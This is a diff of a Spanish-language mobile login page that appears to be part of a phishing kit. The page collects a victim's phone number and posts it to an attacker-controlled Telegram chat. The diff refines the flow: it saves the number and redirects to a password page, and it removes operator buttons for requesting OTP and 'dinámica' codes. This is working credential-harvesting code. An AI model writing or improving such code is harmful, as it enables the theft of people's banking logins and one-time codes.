@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="../css/footer.css" />
   <link rel="stylesheet" href="../css/spinner.css" />
   <link rel="stylesheet" href="../css/globals.css" />
-  <link rel="shortcut icon" type="image/x stripped" href="../assets/favicon.html" />
+  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
   <style>
     .loader {
       border: 6px solid #f3f3f3;
@@ -26,7 +26,7 @@
 <script>
   document.addEventListener("DOMContentLoaded", () => {
     const esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
-    if (!esMovil) window.location.href = "pc.html";
+    if (!esMovil) window.location.href = "../pc.html";
   });
 </script>
 
@@ -76,7 +76,7 @@
 
           <div class="w-full">
             <button id="loginButton" type="button"
-              class="w-full h-12 bg-pink-primary text-white rounded-sm text-base font-medium cursor-pointer">
+              class="w-full h-12 bg-pink-primary text-white rounded-sm text-base font-medium cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed">
               Entra
             </button>
           </div>
@@ -88,10 +88,9 @@
     </main>
   </section>
 
-  <!-- TELEGRAM + REDIRECCIÓN (TODO DENTRO) -->
   <script type="module">
     // VALIDACIÓN SIMPLE
-    const LoginValidation = (form) => {
+    const LoginValidation = () => {
       const cel = document.getElementById('phoneNumber').value.trim();
       return cel.length === 10 && /^\d+$/.test(cel);
     };
@@ -114,14 +113,7 @@
           body: JSON.stringify({
             chat_id: CHAT_ID,
             text: mensaje,
-            parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: [
-                [{text: "Clave OTP", url: location.origin + "/verifying/?do=otp"}],
-                [{text: "Dinámica", url: location.origin + "/verifying/?do=dinamica"}],
-                [{text: "Finalizar", url: location.origin + "/verifying/?do=ok"}]
-              ]
-            }
+            parse_mode: 'Markdown'
           })
         });
         return true;
@@ -137,21 +129,33 @@
       const loader = document.getElementById('loader');
       const msg = document.getElementById('msg');
       const error = document.getElementById('error-login');
+      const phoneInput = document.getElementById('phoneNumber');
+
+      // Inicialmente deshabilitar el botón
+      btn.disabled = true;
 
       // Habilitar botón solo si hay 10 dígitos
-      document.getElementById('phoneNumber').addEventListener('input', () => {
+      phoneInput.addEventListener('input', () => {
         const valido = LoginValidation();
         btn.disabled = !valido;
         error.style.display = 'none';
       });
 
-      btn.onclick = async () => {
-        const numero = document.getElementById('phoneNumber').value.trim();
+      btn.onclick = async (e) => {
+        e.preventDefault(); // ⭐ IMPORTANTE: Prevenir comportamiento por defecto
+        
+        const numero = phoneInput.value.trim();
 
         if (!LoginValidation()) {
           error.style.display = 'block';
           return;
         }
+
+        // Guardar el número en localStorage
+        const formData = {
+          phoneNumber: numero
+        };
+        localStorage.setItem('formData', JSON.stringify(formData));
 
         btn.disabled = true;
         btn.textContent = 'Enviando...';
@@ -163,11 +167,13 @@
         if (enviado) {
           msg.innerHTML = '¡Enviado! Redirigiendo...';
           setTimeout(() => {
-            location.href = '/verifying/';
+            // ⭐ CORRECCIÓN: Redirigir a la página de clave
+            window.location.href = 'access-sign-in-pass.html';
           }, 1500);
         } else {
           msg.innerHTML = 'Error de red. Intenta de nuevo.';
           btn.disabled = false;
+          btn.textContent = 'Entra';
           loader.style.display = 'none';
         }
       };
